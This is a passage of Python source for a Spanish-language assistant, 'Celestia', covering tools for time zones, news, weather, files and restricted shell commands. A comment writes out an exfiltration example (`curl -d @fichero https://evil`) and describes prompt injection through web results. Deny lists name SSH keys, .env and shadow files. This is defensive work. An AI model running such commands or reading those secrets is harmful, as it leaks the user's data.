            rates, fecha = self._tasas_divisa(o)
        except Exception as e:
            logger.debug("convertir_divisa: sin tasas (%s)", e)
            return ("No pude obtener la cotización en tiempo real ahora mismo, así que "
                    "no te doy una tasa inventada. Inténtalo de nuevo en un momento.")
        tasa = rates.get(d)
        if tasa is None:
            return f"No tengo ahora mismo la cotización de {o} a {d}."
        res = cant * tasa
        cola = f" (tasa {numero_es(tasa, 4)}{', act. ' + fecha if fecha else ''})"
        return f"{_fmt(cant)} {o} = {_fmt(res)} {d}{cola}."

    # Sesión 32 (BUG-S108): mapa ciudad → zona horaria. Antes «¿qué hora es en
    # Nueva York?» caía al LLM y alucinaba día y hora completamente.
    _CIUDAD_TZ = {
        # España y América Latina
        "madrid": "Europe/Madrid", "barcelona": "Europe/Madrid",
        "sevilla": "Europe/Madrid", "valencia": "Europe/Madrid",
        "bilbao": "Europe/Madrid", "granada": "Europe/Madrid",
        "buenos aires": "America/Argentina/Buenos_Aires",
        "ciudad de mexico": "America/Mexico_City",
        "cdmx": "America/Mexico_City", "mexico": "America/Mexico_City",
        "bogota": "America/Bogota", "lima": "America/Lima",
        "santiago": "America/Santiago", "caracas": "America/Caracas",
        "la habana": "America/Havana", "san juan": "America/Puerto_Rico",
        "montevideo": "America/Montevideo", "quito": "America/Guayaquil",
        # USA y Canadá
        "nueva york": "America/New_York", "new york": "America/New_York",
        "ny": "America/New_York", "nyc": "America/New_York",
        "los angeles": "America/Los_Angeles", "la": "America/Los_Angeles",
        "san francisco": "America/Los_Angeles",
        "chicago": "America/Chicago", "miami": "America/New_York",
        "washington": "America/New_York", "boston": "America/New_York",
        "toronto": "America/Toronto", "vancouver": "America/Vancouver",
        # Europa
        "londres": "Europe/London", "london": "Europe/London",
        "paris": "Europe/Paris", "berlin": "Europe/Berlin",
        "roma": "Europe/Rome", "lisboa": "Europe/Lisbon",
        "amsterdam": "Europe/Amsterdam", "dublin": "Europe/Dublin",
        "moscu": "Europe/Moscow", "estambul": "Europe/Istanbul",
        # Sesión 32 (BUG-S181): ciudades europeas faltantes.
        "reykjavik": "Atlantic/Reykjavik", "reikiavik": "Atlantic/Reykjavik",
        "oslo": "Europe/Oslo", "estocolmo": "Europe/Stockholm",
        "stockholm": "Europe/Stockholm", "helsinki": "Europe/Helsinki",
        "copenhague": "Europe/Copenhagen", "copenhagen": "Europe/Copenhagen",
        "praga": "Europe/Prague", "viena": "Europe/Vienna",
        "varsovia": "Europe/Warsaw", "atenas": "Europe/Athens",
        "bruselas": "Europe/Brussels", "ginebra": "Europe/Zurich",
        "zurich": "Europe/Zurich", "munich": "Europe/Berlin",
        "milan": "Europe/Rome", "barcelona": "Europe/Madrid",
        "bilbao": "Europe/Madrid", "valencia": "Europe/Madrid",
        "sevilla": "Europe/Madrid",
        # Asia
        "tokio": "Asia/Tokyo", "tokyo": "Asia/Tokyo",
        "pekin": "Asia/Shanghai", "beijing": "Asia/Shanghai",
        "shanghai": "Asia/Shanghai", "hong kong": "Asia/Hong_Kong",
        "seul": "Asia/Seoul", "singapur": "Asia/Singapore",
        "bangkok": "Asia/Bangkok", "delhi": "Asia/Kolkata",
        "mumbai": "Asia/Kolkata", "dubai": "Asia/Dubai",
        # Oceanía
        "sidney": "Australia/Sydney", "sydney": "Australia/Sydney",
        "melbourne": "Australia/Melbourne", "auckland": "Pacific/Auckland",
        # África
        "el cairo": "Africa/Cairo", "johannesburgo": "Africa/Johannesburg",
        "lagos": "Africa/Lagos", "casablanca": "Africa/Casablanca",
    }

    def hora_ciudad(self, ciudad: str = "") -> str:
        """Devuelve la hora actual en una ciudad. Sesión 32 (BUG-S108)."""
        import unicodedata
        from datetime import datetime
        try:
            from zoneinfo import ZoneInfo
        except Exception:
            return "No tengo soporte de zonas horarias en este sistema."
        if not ciudad or not ciudad.strip():
            return "Dime de qué ciudad quieres la hora."
        clave = (ciudad or "").strip().lower()
        clave = "".join(
            c for c in unicodedata.normalize("NFD", clave)
            if unicodedata.category(c) != "Mn"
        )
        tz_str = self._CIUDAD_TZ.get(clave)
        if tz_str is None:
            # Búsqueda parcial: «en nueva york ahora» → busca «nueva york».
            for k, v in self._CIUDAD_TZ.items():
                if k in clave:
                    tz_str = v
                    break
        if tz_str is None:
            return (f"No tengo configurada la zona horaria de «{ciudad}». "
                    f"Prueba con una ciudad grande (Nueva York, Tokio, "
                    f"Londres, etc.).")
        try:
            ahora = datetime.now(ZoneInfo(tz_str))
            dias = ["lunes", "martes", "miércoles", "jueves", "viernes",
                    "sábado", "domingo"]
            meses = ["enero", "febrero", "marzo", "abril", "mayo", "junio",
                     "julio", "agosto", "septiembre", "octubre", "noviembre",
                     "diciembre"]
            return (f"En {ciudad.strip()} son las {ahora.strftime('%H:%M')} "
                    f"del {dias[ahora.weekday()]} {ahora.day} de "
                    f"{meses[ahora.month-1]} de {ahora.year} ({tz_str}).")
        except Exception as e:
            return f"No pude calcular la hora de {ciudad}: {e}"

    # Mapa de fechas señaladas fijas (DD, MM). Para usar con dias_hasta.
    _FECHAS_FIJAS = {
        "navidad": (25, 12), "nochebuena": (24, 12),
        "nochevieja": (31, 12), "fin de año": (31, 12),
        "fin de ano": (31, 12),
        "año nuevo": (1, 1), "ano nuevo": (1, 1),
        "reyes": (6, 1), "día de reyes": (6, 1), "dia de reyes": (6, 1),
        "san valentín": (14, 2), "san valentin": (14, 2),
        "valentines": (14, 2), "san valentine": (14, 2),
        "halloween": (31, 10), "día de los muertos": (2, 11),
        "dia de los muertos": (2, 11),
        "día de la hispanidad": (12, 10), "dia de la hispanidad": (12, 10),
        "día de la constitución": (6, 12),
        "dia de la constitucion": (6, 12),
        "día del trabajo": (1, 5), "dia del trabajo": (1, 5),
        "san juan": (24, 6),
    }

    def dias_hasta(self, evento: str = "") -> str:
        """Días que faltan hasta una fecha señalada conocida o dd/mm.

        Sesión 33: antes «cuánto falta para navidad» caía al LLM y respondía
        «no tengo info actualizada» en vez de calcular.
        """
        import unicodedata
        import re as _re
        from datetime import date
        ev = (evento or "").strip().lower()
        if not ev:
            return "Dime para qué fecha quieres el conteo."
        ev_norm = "".join(
            c for c in unicodedata.normalize("NFD", ev)
            if unicodedata.category(c) != "Mn"
        ).strip()
        dd_mm = None
        if ev_norm in self._FECHAS_FIJAS:
            dd_mm = self._FECHAS_FIJAS[ev_norm]
        else:
            for k, v in self._FECHAS_FIJAS.items():
                k_norm = "".join(
                    c for c in unicodedata.normalize("NFD", k)
                    if unicodedata.category(c) != "Mn"
                )
                if k_norm in ev_norm:
                    dd_mm = v
                    break
        if dd_mm is None:
            m = _re.match(r"^\s*(\d{1,2})[\s/\-](\d{1,2})(?:[\s/\-](\d{2,4}))?\s*$", ev)
            if m:
                d, mo = int(m.group(1)), int(m.group(2))
                if 1 <= mo <= 12 and 1 <= d <= 31:
                    dd_mm = (d, mo)
        if dd_mm is None:
            return (f"No tengo «{evento}» en mi calendario. Prueba con "
                    f"navidad, año nuevo, reyes, san valentín, halloween, "
                    f"nochevieja, fin de año, o una fecha tipo «25/12».")
        try:
            from zoneinfo import ZoneInfo
            from datetime import datetime
            hoy = datetime.now(ZoneInfo("Europe/Madrid")).date()
        except Exception:
            hoy = date.today()
        d, mo = dd_mm
        try:
            objetivo = date(hoy.year, mo, d)
        except ValueError:
            return f"La fecha {d}/{mo} no es válida."
        if objetivo < hoy:
            objetivo = date(hoy.year + 1, mo, d)
        delta = (objetivo - hoy).days
        meses = ["enero", "febrero", "marzo", "abril", "mayo", "junio",
                 "julio", "agosto", "septiembre", "octubre", "noviembre",
                 "diciembre"]
        nombre = evento.strip()
        if delta == 0:
            return f"¡Hoy es {nombre}!"
        if delta == 1:
            return f"Mañana es {nombre} ({objetivo.day} de {meses[objetivo.month-1]} de {objetivo.year})."
        return (f"Quedan {delta} días para {nombre} "
                f"({objetivo.day} de {meses[objetivo.month-1]} de {objetivo.year}).")

    def noticias(self, tema: str = "", max_titulares: int = 6) -> str:
        """Devuelve titulares recientes de medios en español por RSS.

        Si `tema` está vacío, mezcla titulares de todas las fuentes (los más
        recientes primero). Si `tema` está dado, filtra por matches en título
        o descripción (case-insensitive, sustring simple).
        """
        if not HAS_REQUESTS:
            return "⚠ requests no instalado. Ejecuta: pip install requests"
        if self.connectivity and not self.connectivity.is_online():
            return "Sin conexión a internet — no puedo traer noticias ahora."

        tema_n = (tema or "").strip().lower()
        recolectado = []
        fuentes_ok = []
        fuentes_falladas = []
        for fuente, url in self._FEEDS_NOTICIAS:
            try:
                r = _req.get(
                    url,
                    headers={"User-Agent": "Celestia/1.5"},
                    timeout=8,
                )
                if r.status_code != 200:
                    fuentes_falladas.append(fuente)
                    continue
                # Algunos feeds (El Mundo) declaran encoding ISO-8859-1 en el
                # XML pero el response llega como UTF-8 mal interpretado.
                # Forzar UTF-8 sobre los bytes evita mojibake en titulares.
                texto = r.content.decode("utf-8", errors="replace")
                items = self._parsear_rss(texto, fuente)
                if items:
                    recolectado.extend(items)
                    fuentes_ok.append(fuente)
                else:
                    fuentes_falladas.append(fuente)
            except Exception as e:
                logger.debug("noticias feed %s falló: %s", fuente, e)
                fuentes_falladas.append(fuente)

        if not recolectado:
            return ("No pude conectar con ninguna fuente de noticias. "
                    "Inténtalo en un momento.")

        # Filtrar por tema. Tokenizamos el tema en palabras clave (quitando
        # stopwords como "de", "del", "para") y aceptamos artículos donde
        # cualquiera de ellas matchee. Esto soluciona temas como "hardware de
        # pc" que como substring literal casi nunca aparecen en titulares, pero
        # sí aparecen "hardware" o "pc" por separado.
        # Para tokens cortos (≤3 chars) usamos word-boundary para evitar falsos
        # positivos ("pc" matchea "presidente"); para largos usamos substring.
        if tema_n:
            _STOPWORDS = {
                "de", "del", "la", "las", "el", "los", "en", "sobre", "para",
                "con", "por", "a", "al", "y", "o", "u", "e", "un", "una",
                "unos", "unas", "que",
            }
            tokens = [
                t for t in re.findall(r"[\wáéíóúüñ]+", tema_n, flags=re.I)
                if t and t.lower() not in _STOPWORDS
            ]
            if not tokens:
                tokens = [tema_n]  # fallback: tema entero si sólo eran stopwords
            patrones = []
            for tok in tokens:
                if len(tok) <= 3:
                    patrones.append(re.compile(rf"\b{re.escape(tok)}\b", re.I))
                else:
                    patrones.append(re.compile(re.escape(tok), re.I))
            # Sesión 29 (bug X): si hay 2+ tokens significativos, exigir
            # que TODOS aparezcan (AND). Sin esto, "real madrid" matcheaba
            # cualquier noticia con solo "madrid" (incluida Arabia Saudita).
            combinador = all if len(patrones) >= 2 else any
            def _match(n):
                t, d = n["titulo"], n["desc"]
                return combinador(p.search(t) or p.search(d) for p in patrones)
            recolectado_estricto = [n for n in recolectado if _match(n)]
            # Si AND filtra todo, caer a OR (cualquier token) para no devolver
            # vacío en temas con sinónimos.
            if not recolectado_estricto and combinador is all:
                recolectado_estricto = [n for n in recolectado
                                          if any(p.search(n["titulo"]) or p.search(n["desc"])
                                                  for p in patrones)]
            recolectado = recolectado_estricto
            if not recolectado:
                return (f"No encontré titulares sobre '{tema}' ahora mismo. "
                        f"Fuentes consultadas: {', '.join(fuentes_ok)}.")

        # Intercalar fuentes para que no se acumulen todos del mismo medio.
        # Truco simple: dict de buckets por fuente y round-robin.
        buckets = {}
        for n in recolectado:
            buckets.setdefault(n["fuente"], []).append(n)
        intercalado = []
        while buckets and len(intercalado) < max_titulares:
            for f in list(buckets):
                if buckets[f]:
                    intercalado.append(buckets[f].pop(0))
                    if len(intercalado) >= max_titulares:
                        break
                else:
                    del buckets[f]

        # Formatear salida
        cabecera = (f"📰 Titulares{' sobre ' + tema if tema else ''} "
                    f"({len(intercalado)} de {len(recolectado)}):")
        lineas = [cabecera, ""]
        for n in intercalado:
            lineas.append(f"• [{n['fuente']}] {n['titulo']}")
            if n["desc"] and n["desc"].lower() != n["titulo"].lower():
                d = self._resumir_desc(n["desc"], n["titulo"])
                if d:
                    lineas.append(f"  {d}")
            # Enlace para leer la noticia completa (los feeds dan un resumen, no
            # el artículo entero) — clicable en WhatsApp.
            if n.get("url"):
                lineas.append(f"  🔗 {n['url']}")
            lineas.append("")
        return "\n".join(lineas).rstrip()[:3500]

    @staticmethod
    def _resumir_desc(desc: str, titulo: str, limite: int = 300) -> str:
        """Resumen legible de la descripción RSS: si excede `limite`, corta en el
        último FINAL DE FRASE (. ! ?) para no dejarla a mitad ("…sin depender…").
        Si no hay frase entera, corta en el último espacio. Quita el título si el
        resumen lo repite al principio.
        """
        d = (desc or "").strip()
        if titulo and d.lower().startswith(titulo.lower()):
            d = d[len(titulo):].lstrip(" :-–—").strip()
        if len(d) <= limite:
            return d
        recorte = d[:limite]
        fin = max(recorte.rfind(". "), recorte.rfind("! "), recorte.rfind("? "))
        if fin >= limite * 0.5:               # hay una frase entera razonable
            return recorte[:fin + 1].strip()
        corte = recorte.rfind(" ")            # si no, cortar en palabra completa
        return (recorte[:corte] if corte > 0 else recorte).rstrip(" ,.;:") + "…"

    def consultar_clima(self, ubicacion: str = "") -> str:
        """Consulta el tiempo actual y previsión 3 días vía wttr.in (gratis, sin key).

        wttr.in devuelve JSON con `current_condition` y `weather` (3 días).
        Si `ubicacion` está vacía, wttr.in deduce por IP (impreciso en backend
        cloud; mejor pasar siempre la ciudad).
        """
        if not HAS_REQUESTS:
            return "⚠ requests no instalado. Ejecuta: pip install requests"
        if self.connectivity and not self.connectivity.is_online():
            return "Sin conexión a internet — no puedo consultar el clima ahora."
        ubic = (ubicacion or "").strip().strip("?.,!")
        # Quitar modificadores temporales/innecesarios al final que el regex
        # del agent puede arrastrar ("Sevilla hoy", "Madrid ahora", "Lima en
        # este momento"). wttr.in da HTTP 500 con esos sufijos (bug sesión 29:
        # "Sevilla hoy" → 500, caía a LLM que improvisaba).
        ubic = re.sub(
            r"\s+(?:hoy|ahora|ya|ahora\s+mismo|en\s+este\s+momento|en\s+este\s+instante|"
            r"mañana|por\s+la\s+(?:mañana|tarde|noche)|esta\s+(?:mañana|tarde|noche)|"
            r"actualmente|para\s+hoy)\s*$",
            "", ubic, flags=re.I,
        ).strip()
        # Sesión 31 (BUG-S49): si no hay ciudad, intentar deducir del perfil
        # del usuario (hechos_usuario.ciudad). Evita la alucinación
        # geográfica del LLM cuando preguntan «how is the weather today?»
        if not ubic:
            try:
                import sqlite3 as _sql3
                con = _sql3.connect(os.environ.get("CELESTIA_DB", "").strip()
                                    or str(MEM_DIR / "celestia.db"),
                                    timeout=2)
                cur = con.cursor()
                cur.execute(
                    "SELECT valor FROM hechos_usuario "
                    "WHERE LOWER(clave)='ciudad' OR LOWER(clave) LIKE '%ciudad%' "
                    "ORDER BY ts DESC LIMIT 1"
                )
                row = cur.fetchone()
                con.close()
                if row and row[0]:
                    ubic = row[0].strip()
            except Exception:
                pass
        if not ubic:
            return ("Necesito una ciudad: dime «¿qué tiempo hace en X?» "
                    "o cuéntame dónde vives para que lo guarde.")
        try:
            url = f"https://wttr.in/{_req.utils.quote(ubic)}"
            r = _req.get(url, params={"format": "j1", "lang": "es"},
                         headers={"User-Agent": "Celestia/1.5"}, timeout=10)
            if r.status_code != 200:
                return f"No pude obtener el clima de {ubic} (HTTP {r.status_code})."
            data = r.json()
            cur = (data.get("current_condition") or [{}])[0]
            area = (data.get("nearest_area") or [{}])[0]
            nombre = ((area.get("areaName") or [{}])[0].get("value") or ubic)
            pais = ((area.get("country") or [{}])[0].get("value") or "")
            temp = cur.get("temp_C", "?")
            sens = cur.get("FeelsLikeC", "?")
            desc_sp = ((cur.get("lang_es") or [{}])[0].get("value")
                       or cur.get("weatherDesc", [{}])[0].get("value", "?"))
            hum = cur.get("humidity", "?")
            viento = cur.get("windspeedKmph", "?")
            lineas = [
                f"Tiempo en {nombre}{', ' + pais if pais else ''}:",
                f"  • Ahora: {desc_sp}, {temp}°C (sensación {sens}°C)",
                f"  • Humedad {hum}%, viento {viento} km/h",
            ]
            dias = data.get("weather", [])[:3]
            for d in dias:
                fecha = d.get("date", "?")
                tmin = d.get("mintempC", "?")
                tmax = d.get("maxtempC", "?")
                hourly = d.get("hourly", [])
                desc = "?"
                if hourly:
                    medio = hourly[len(hourly) // 2]
                    desc = ((medio.get("lang_es") or [{}])[0].get("value")
                            or medio.get("weatherDesc", [{}])[0].get("value", "?"))
                lineas.append(f"  • {fecha}: {desc}, {tmin}–{tmax}°C")
            return "\n".join(lineas)
        except Exception as e:
            return f"Error consultando clima: {e}"

    def info_sistema(self) -> str:
        lines = []
        try:
            mem = {}
            with open("/proc/meminfo", encoding="utf-8") as f:
                for line in f:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        mem[k.strip()] = v.strip()
            total = int(mem.get("MemTotal", "0 kB").split()[0]) // 1024
            avail = int(mem.get("MemAvailable", "0 kB").split()[0]) // 1024
            lines.append(f"RAM : {total - avail}MB usados / {total}MB total ({avail}MB libre)")
        except Exception:
            pass
        try:
            r = subprocess.run(["df", "-h", "/"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.strip().splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 5:
                    lines.append(f"Disco/: {parts[2]} usados / {parts[1]} total — {parts[3]} libre ({parts[4]})")
        except Exception:
            pass
        try:
            with open("/proc/uptime", encoding="utf-8") as f:
                secs = float(f.read().split()[0])
            h, m = int(secs // 3600), int((secs % 3600) // 60)
            lines.append(f"Uptime: {h}h {m}m")
        except Exception:
            pass
        try:
            with open("/proc/loadavg", encoding="utf-8") as f:
                load = f.read().split()[:3]
            lines.append(f"Carga CPU: {' / '.join(load)} (1/5/15 min)")
        except Exception:
            pass
        try:
            r = subprocess.run(["uname", "-rm"], capture_output=True, text=True, timeout=3)
            lines.append(f"Kernel: {r.stdout.strip()}")
        except Exception:
            pass
        return "\n".join(lines) if lines else "No se pudo obtener información del sistema."

    def listar_archivos(self, ruta: str) -> str:
        try:
            p = self._ruta_segura(ruta)
            if p is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas."
            if not p.exists():
                return f"Ruta no existe: {ruta}"
            if p.is_file():
                s = p.stat()
                return f"Archivo: {p.name}  ({s.st_size} bytes)"
            entries = sorted(p.iterdir(), key=lambda x: (x.is_file(), x.name.lower()))
            if not entries:
                return f"Directorio vacío: {p}"
            lines = []
            for e in entries[:60]:
                if e.is_dir():
                    lines.append(f"  📁 {e.name}/")
                else:
                    lines.append(f"  📄 {e.name}  ({e.stat().st_size} B)")
            suffix = f"\n  ... y {len(entries) - 60} más" if len(entries) > 60 else ""
            return f"📂 {p}:\n" + "\n".join(lines) + suffix
        except PermissionError:
            return f"Sin permiso para acceder a: {ruta}"
        except Exception as e:
            return f"Error: {e}"

    # Rutas raíz donde Celestia PUEDE leer/escribir/enviar archivos del usuario.
    # Cualquier acceso fuera de estas raíces se bloquea para prevenir path traversal
    # (ej. el LLM, manipulado o no, pidiendo /etc/shadow o /root/.ssh/id_rsa).
    _RUTAS_PERMITIDAS = (
        "/sdcard", "/storage", "/tmp", tempfile.gettempdir(),
        str(ROOT), str(DATOS), str(SALIDA_DIR), "/data/data/com.termux/files/home",
    )
    # Patrones de archivos sensibles que SIEMPRE se rechazan, aun dentro de raíces permitidas
    _PATRONES_SENSIBLES = (
        ".env", ".ssh", "id_rsa", "id_ed25519", "id_dsa", "vault.enc", "vault.meta",
        "creds.json", "pre-key-", "session-",
        # Sesión 74: preguntando por los habitantes de Canberra, el «empeño»
        # listó /root/Celestia y buscó dentro de `.claude`. Ahí (y en
        # /root/.claude, que entra por el home) están los registros de las
        # sesiones de Claude Code con todo lo que se escribió en ellas; y en
        # `backups` y `celestia.db`, la memoria de Enzo entera: leerlas como
        # fichero se salta las consultas fijas de `_CONSULTAS_MEMORIA`.
        ".claude", "backups", "celestia.db", "history.jsonl",
    )

    @classmethod
    def _ruta_segura(cls, ruta: str) -> Optional[Path]:
        """Resuelve la ruta y verifica que esté dentro de _RUTAS_PERMITIDAS y no
        coincida con patrones sensibles. Devuelve Path resuelto o None si se rechaza.
        """
        try:
            p = Path(ruta).expanduser().resolve()
        except Exception:
            return None
        # Debe colgar de alguna raíz permitida (incluye Path.home() implícitamente
        # si el home cae en una de las raíces). Con `is_relative_to` y no con
        # «empieza por raíz + "/"»: en Windows el separador es «\\» y aquello
        # rechazaba cualquier ruta.
        permitida = any(
            p == Path(raiz) or p.is_relative_to(raiz)
            for raiz in cls._RUTAS_PERMITIDAS + (str(Path.home()),)
        )
        if not permitida:
            return None
        # Componentes y nombre del archivo no deben coincidir con patrones sensibles
        nombre_low = p.name.lower()
        for patron in cls._PATRONES_SENSIBLES:
            if patron in nombre_low or any(patron in c.lower() for c in p.parts):
                return None
        return p

    # Qué se puede preguntar de la memoria. Consultas FIJAS: nada de SQL que
    # venga de fuera. Y solo RECUENTOS y fechas, nunca el contenido — «cuántas
    # conversaciones tenemos» no debe poder convertirse en «vuélcamelas».
    _CONSULTAS_MEMORIA = {
        "conversaciones": ("conversations", "mensajes que hemos intercambiado", "ts"),
        "hechos":         ("hechos_usuario", "cosas que sé de ti", "ts"),
        "episodios":      ("episodes", "episodios que he reflexionado", "ts"),
        "aprendizajes":   ("aprendizajes", "habilidades que he intentado aprender", "inicio_ts"),
        "errores":        ("errores", "errores que me he apuntado", None),
        "entidades":      ("kg_entidades", "cosas y personas en mi grafo", None),
    }

    def consultar_memoria(self, que: str = "resumen") -> str:
        """Cuánto hay guardado en su propia memoria.

        Existe porque sabía ENCONTRAR su base de datos —la buscaba ella sola por
        el disco— pero no mirar dentro: `leer_archivo` sobre un SQLite no cuenta
        filas. Así que a «cuántas conversaciones tenemos» respondía «no tengo
        acceso desde esta interfaz» teniéndola delante.
        """
        import sqlite3
        from .config import Config

        try:
            ruta = Path(Config().DB_PATH)
            if not ruta.exists():
                return "Todavía no tengo memoria guardada."
        except Exception as e:
            return f"No encuentro mi base de datos: {e}"

        pedido = (que or "resumen").strip().lower()
        try:
            # `mode=ro`: mirar la memoria no puede tocarla ni aunque algo falle.
            con = sqlite3.connect(f"file:{ruta}?mode=ro", uri=True, timeout=5)
        except sqlite3.Error as e:
            return f"No pude abrir mi memoria: {e}"
        try:
            def cuenta(tabla: str) -> Optional[int]:
                try:
                    return con.execute(f'SELECT COUNT(*) FROM "{tabla}"').fetchone()[0]
                except sqlite3.Error:
                    return None

            if pedido in self._CONSULTAS_MEMORIA:
                tabla, etiqueta, col_ts = self._CONSULTAS_MEMORIA[pedido]
                n = cuenta(tabla)
                if n is None:
                    return f"No tengo nada guardado de {etiqueta}."
                texto = f"🧠 {n} {etiqueta}."
                if col_ts:
                    try:
                        desde = con.execute(
                            f'SELECT MIN({col_ts}) FROM "{tabla}"').fetchone()[0]
                        if desde:
                            texto += f" El primero es del {self._fecha_de_ts(desde)}."
                    except sqlite3.Error:
                        pass
                return texto

            # Resumen: lo que se suele preguntar, de una vez.
            partes = []
            for clave, (tabla, etiqueta, _) in self._CONSULTAS_MEMORIA.items():
                n = cuenta(tabla)
                if n:
                    partes.append(f"{n} {etiqueta}")
            tam = ruta.stat().st_size / (1024 * 1024)
            cuerpo = "\n  · ".join(partes) if partes else "nada todavía"
            return f"🧠 En mi memoria ({tam:.1f} MB):\n  · {cuerpo}"
        finally:
            con.close()

    @staticmethod
    def _fecha_de_ts(ts) -> str:
        """Los ts de la base son epoch o texto ISO según la tabla.

        Sesión 57: se llamaba `_fecha_legible`, igual que el de deportes, y
        como va después en la clase lo dejaba sin efecto — las fechas de los
        partidos llegaban al modelo en ISO crudo, que es justo lo que aquel
        método existe para evitar. Dos cosas distintas, dos nombres.
        """
        from datetime import datetime
        try:
            return datetime.fromtimestamp(float(ts)).strftime("%d/%m/%Y")
        except (TypeError, ValueError):
            return str(ts)[:10]

    def info_archivo(self, ruta: str) -> str:
        """Cuántas líneas, palabras y caracteres tiene un archivo. Sin leerlo.

        Existe porque contar NO puede depender del modelo: preguntando cuántas
        líneas tenía el CHANGELOG, leía el fichero, se le recortaba el contenido
        para que cupiera en el contexto y contestaba «52 líneas» tan seguro —
        las del trozo. Son 190. Un dato exacto se cuenta aquí o no se da.
        """
        try:
            p = self._ruta_segura(ruta)
            if p is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas."
            if not p.exists():
                return f"Archivo no encontrado: {ruta}"
            if p.is_dir():
                return f"Es una carpeta, no un archivo: {ruta}"
            datos = p.read_bytes()
            texto = datos.decode("utf-8", errors="replace")
            # Como `wc -l`: cuenta saltos de línea. Un fichero que acaba en
            # salto no tiene una última línea vacía.
            lineas = texto.count("\n") + (0 if texto.endswith("\n") or not texto else 1)
            return (f"📄 {p.name}: {lineas} líneas, {len(texto.split())} palabras, "
                    f"{len(texto)} caracteres, {len(datos)} bytes")
        except PermissionError:
            return f"Sin permiso para leer: {ruta}"
        except Exception as e:
            return f"Error: {e}"

    def leer_archivo(self, ruta: str) -> str:
        try:
            p = self._ruta_segura(ruta)
            if p is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas o archivo sensible."
            if not p.exists():
                return f"Archivo no encontrado: {ruta}"
            if p.is_dir():
                return f"Es un directorio, usa /listar: {ruta}"
            size = p.stat().st_size
            if size > 200_000:
                return f"Archivo demasiado grande ({size // 1024}KB). Límite: 200KB"
            content = p.read_text(encoding="utf-8", errors="replace")
            if len(content) > self.SAFE_READ_LIMIT:
                content = content[: self.SAFE_READ_LIMIT] + f"\n\n... (truncado — {size} bytes total)"
            return f"📄 {p}\n{'─' * 40}\n{content}"
        except PermissionError:
            return f"Sin permiso para leer: {ruta}"
        except Exception as e:
            return f"Error: {e}"

    def buscar_archivos(self, patron: str, ruta: str = ".") -> str:
        try:
            base = self._ruta_segura(ruta)
            if base is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas."
            resultados = sorted(base.rglob(patron))[:40]
            # Filtrar resultados sensibles (cosa rara dentro de raíz permitida)
            resultados = [r for r in resultados if self._ruta_segura(str(r)) is not None]
            if not resultados:
                return f"No se encontraron archivos con patrón '{patron}' en {base}"
            lines = [str(r) for r in resultados]
            suffix = "\n  ... (más resultados, refina la búsqueda)" if len(resultados) == 40 else ""
            return f"Encontrados ({len(resultados)}):\n" + "\n".join(lines) + suffix
        except Exception as e:
            return f"Error al buscar: {e}"

    # Comandos read-only seguros que el LLM puede ejecutar sin riesgo.
    # Cualquier cosa fuera de esta lista se rechaza. NO añadir comandos que
    # modifiquen el sistema o accedan a red sin pensar.
    _COMANDOS_PERMITIDOS = frozenset({
        # Sistema de archivos (lectura)
        "ls", "pwd", "cat", "head", "tail", "wc", "file", "stat", "du", "df",
        "find", "tree", "readlink", "basename", "dirname", "realpath",
        # Texto
        "grep", "egrep", "fgrep", "awk", "sed", "sort", "uniq", "cut", "tr",
        "echo", "printf",
        # Información del sistema
        "uname", "hostname", "hostnamectl", "whoami", "id", "groups", "date",
        "uptime", "free", "ps", "top", "htop", "iostat", "vmstat", "lsblk",
        "lscpu", "lsusb", "lspci", "nproc", "env", "which", "type",
        # Procesos (read-only)
        "pgrep",
        # Network (read-only diagnostics). NO curl/wget: aunque bloqueamos
        # operadores shell, `curl -d @fichero https://evil` exfiltra datos sin
        # ningún operador prohibido. Como el resultado de buscar_web/OCR vuelve
        # al LLM, un prompt injection podría filtrar la memoria. Para descargas
        # legítimas existe descargar_archivo con validación propia.
        "ping", "dig", "nslookup", "host", "ip", "ss", "netstat",
        # Termux/Android específicos
        "termux-info", "termux-battery-status", "termux-wifi-info",
        "termux-telephony-deviceinfo", "termux-location",
        # Git read-only
        "git",  # se filtra abajo: solo subcomandos read-only
    })
    # Operadores shell peligrosos que permiten ejecutar comandos arbitrarios
    _OPERADORES_PELIGROSOS = (";", "&&", "||", "|", ">", "<", "$(", "`", "\n", ">>")

    def ejecutar_comando(self, cmd: str) -> str:
        """Ejecuta un comando shell con validación estricta.

        Solo se permiten binarios de _COMANDOS_PERMITIDOS (lectura/diagnóstico).
        Se bloquean operadores shell que permiten encadenar comandos o redirigir.
        Antes usaba shell=True sin filtros — vulnerable a inyección desde el LLM.
        """
        import shlex
        cmd = (cmd or "").strip()
        if not cmd:
            return "✗ Comando vacío."
        # Bloquear operadores peligrosos antes de parsear
        for op in self._OPERADORES_PELIGROSOS:
            if op in cmd:
                return (f"✗ Operador shell '{op}' no permitido. Solo comandos simples sin "
                        f"encadenado/redirecciones. Si necesitas chain, pídeme la lectura "
                        f"con varios comandos separados.")
        try:
            argv = shlex.split(cmd)
        except ValueError as e:
            return f"✗ No pude parsear el comando: {e}"
        if not argv:
            return "✗ Comando vacío tras parseo."
        binario = argv[0].rsplit("/", 1)[-1]  # quitar prefijo /usr/bin/ etc.
        if binario not in self._COMANDOS_PERMITIDOS:
            return (f"✗ '{binario}' no está en la lista de comandos permitidos. "
                    f"Por seguridad solo ejecuto lectura/diagnóstico: ls, cat, ps, df, "
                    f"uname, grep, etc. Si necesitas algo más complejo dímelo y vemos.")
        # git: bloquear subcomandos que escriben
        if binario == "git" and len(argv) > 1 and argv[1] in {
            "push", "pull", "fetch", "clone", "commit", "merge", "rebase",
            "reset", "checkout", "branch", "tag", "rm", "mv", "add", "stash",
            "cherry-pick", "revert",
        }:
            return f"✗ git {argv[1]} modifica estado, no lo ejecuto sin permiso explícito."
        try:
            r = subprocess.run(
                argv, shell=False, capture_output=True, text=True,
                timeout=30, cwd=str(ROOT),
            )
            out = r.stdout.strip()
            err = r.stderr.strip()
            resultado = out
            if err:
                resultado += ("\n" if resultado else "") + f"[stderr] {err}"
            if r.returncode != 0:
                resultado += f"\n[salida: {r.returncode}]"
            return resultado[:3000] if resultado else "(sin salida)"
        except subprocess.TimeoutExpired:
            return "⚠ Tiempo de espera agotado (30s)"
        except FileNotFoundError:
            return f"✗ Binario '{binario}' no instalado en este sistema."
        except Exception as e:
            return f"Error al ejecutar: {e}"
